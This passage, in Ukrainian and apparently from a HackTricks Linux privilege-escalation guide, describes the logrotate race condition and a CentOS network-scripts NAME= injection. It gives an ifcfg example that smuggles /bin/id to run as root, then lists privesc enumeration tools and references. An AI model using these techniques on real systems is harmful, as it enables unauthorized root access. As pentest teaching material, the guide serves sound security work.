Уразливість у `logrotate` дозволяє користувачам з **правами запису** у файл журналу або його батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто запускається як **root**, можна змусити виконати довільні файли, особливо в директоріях типу _**/etc/bash_completion.d/**_. Важливо перевіряти права не тільки в _/var/log_, а й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця вразливість впливає на `logrotate` версії `3.18.0` та старіші

Більш детальну інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ви можете експлуатувати цю вразливість за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тому коли ви виявляєте можливість змінювати логи, перевірте, хто керує цими логами, і чи можна ескалювати привілеї, замінивши логи symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` в _/etc/sysconfig/network-scripts_ **або** може **підправити** існуючий, то ваша **система pwned**.

Мережеві скрипти, наприклад _ifcg-eth0_, використовуються для мережевих підключень. Вони виглядають точно як .INI файли. Однак вони ~sourced~ на Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` в цих мережевих скриптах оброблявся некоректно. Якщо в імені є **пробіл/blank space**, система намагається виконати частину після пробілу. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network і /bin/id_)

### **init, init.d, systemd, and rc.d**

Каталог `/etc/init.d` містить **скрипти** для System V init (SysVinit) — **класичної системи управління сервісами в Linux**. Він включає скрипти для `start`, `stop`, `restart`, а іноді й `reload` сервісів. Їх можна виконувати безпосередньо або через символічні посилання в `/etc/rc?.d/`. Альтернативний шлях у системах Redhat — `/etc/rc.d/init.d`.

З іншого боку, `/etc/init` пов'язаний з **Upstart**, новішою **системою управління сервісами**, представленою в Ubuntu, яка використовує конфігураційні файли для керування сервісами. Незважаючи на перехід на Upstart, скрипти SysVinit все ще використовуються поряд із конфігураціями Upstart через шар сумісності в Upstart.

**systemd** постає як сучасний менеджер ініціалізації та сервісів, пропонуючи розширені можливості, такі як запуск daemon за запитом, керування automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші трюки

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks часто підмінюють syscall, щоб надати привілейовану функціональність ядра userspace manager'у. Слабка аутентифікація manager'а (наприклад, перевірки підпису, що базуються на FD-order, або слабкі схеми паролів) може дозволити локальній аплікації видаватися за manager і escalate до root на пристроях, що вже мають root. Дізнайтесь більше та деталі експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Додаткова допомога

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
